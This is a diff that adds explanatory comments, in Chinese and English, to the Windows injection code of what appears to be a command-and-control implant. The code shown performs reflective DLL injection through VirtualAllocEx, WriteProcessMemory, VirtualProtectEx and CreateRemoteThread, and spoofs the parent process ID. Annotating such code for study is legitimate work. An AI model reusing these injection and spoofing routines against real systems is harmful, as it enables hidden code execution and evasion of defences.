@@ -352,6 +352,8 @@ func ExecuteAssembly(data []byte, process string, processArgs []string, ppid uin
 	return stdoutBuf.String() + stderrBuf.String(), nil
 }
 
+// RDI执行，DLL与参数会分两次写入目标进程中
+// 会通过kill来决定目标进程是否需要一直存活
 func SpawnDll(procName string, processArgs []string, ppid uint32, data []byte, offset uint32, args string, kill bool) (string, error) {
 	var lpTargetHandle windows.Handle
 	err := refresh()
@@ -391,6 +393,7 @@ func SpawnDll(procName string, processArgs []string, ppid uint32, data []byte, o
 	defer windows.CloseHandle(lpTargetHandle)
 	dataAddr, err := allocAndWrite(data, lpTargetHandle, uint32(len(data)))
 	argAddr := uintptr(0)
+	// 如果有参数，会申请新内存，将参数放置到目标进程
 	if len(args) > 0 {
 		//{{if .Config.Debug}}
 		log.Printf("Args: %s\n", args)
@@ -404,6 +407,7 @@ func SpawnDll(procName string, processArgs []string, ppid uint32, data []byte, o
 	//{{if .Config.Debug}}
 	log.Printf("[*] Args addr: 0x%08x\n", argAddr)
 	//{{end}}
+	// 申请地址+偏移，猜测是RDI DLL
 	startAddr := uintptr(dataAddr) + uintptr(offset)
 	threadHandle, err := protectAndExec(lpTargetHandle, dataAddr, startAddr, argAddr, uint32(len(data)))
 	if err != nil {
@@ -413,6 +417,8 @@ func SpawnDll(procName string, processArgs []string, ppid uint32, data []byte, o
 	log.Printf("[*] RemoteThread started. Waiting for execution to finish.\n")
 	// {{end}}
 
+	// 如果选择杀死进程，则会等待执行结束后回传结果，并将进程Kill掉
+	// 否则，会直接返回""，进程会一直存在
 	if kill {
 		err = waitForCompletion(threadHandle)
 		if err != nil {
@@ -460,6 +466,7 @@ func refresh() error {
 	return nil
 }
 
+// exec.Command启动新进程，会Spoof PPID
 func startProcess(proc string, args []string, ppid uint32, stdout *bytes.Buffer, stderr *bytes.Buffer, suspended bool) (*exec.Cmd, error) {
 	var cmd *exec.Cmd
 	if len(args) > 0 {
@@ -518,6 +525,7 @@ func waitForCompletion(threadHandle windows.Handle) error {
 	return nil
 }
 
+// VirtualAllocEx and WriteProcessMemory
 func allocAndWrite(data []byte, handle windows.Handle, size uint32) (dataAddr uintptr, err error) {
 	// VirtualAllocEx to allocate a new memory segment into the target process
 	dataAddr, err = syscalls.VirtualAllocEx(handle, uintptr(0), uintptr(size), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
@@ -533,6 +541,7 @@ func allocAndWrite(data []byte, handle windows.Handle, size uint32) (dataAddr ui
 	return
 }
 
+// VirtualProtectEx(PAGE_EXECUTE_READ) and CreateRemoteThread
 func protectAndExec(handle windows.Handle, startAddr uintptr, threadStartAddr uintptr, argAddr uintptr, dataLen uint32) (threadHandle windows.Handle, err error) {
 	var oldProtect uint32
 	err = syscalls.VirtualProtectEx(handle, startAddr, uintptr(dataLen), windows.PAGE_EXECUTE_READ, &oldProtect)
